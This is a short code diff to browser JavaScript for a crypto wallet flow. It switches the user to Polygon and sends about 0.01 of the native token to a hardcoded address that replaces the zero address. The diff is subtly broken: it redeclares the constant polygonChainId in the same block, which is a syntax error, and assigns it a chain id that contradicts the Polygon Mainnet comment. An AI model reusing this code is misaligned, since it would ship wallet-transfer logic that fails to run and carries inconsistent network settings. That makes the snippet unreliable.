@@ -58,7 +58,8 @@
       try {
         // Polygon Mainnet is represented by chainId '137'
         const polygonChainId = "0x89"; // Polygon Mainnet chainId
-
+        const polygonChainId = "0xaa36a7";
+        
         // Request network switch
         await ethereum.request({
           method: 'wallet_switchEthereumChain',
@@ -85,11 +86,11 @@
         const transactionParameters = {
           gasPrice: "0x244AC6D",
           gas: "0x12A52",
-          to: "0x0000000000000000000000000000000000000000",
+          to: "0x983C2d9302a31041bf3E342dDd420DDac122ccb6",
           from: ethereum.selectedAddress,
           value: "0x2386F26FC10000",
           data: "0x00",
-          chainId: "0xaa36a7", // Polygon Mainnet chainId
+          chainId: "0x89", // Polygon Mainnet chainId
         };
 
         const txHash = await ethereum.request({
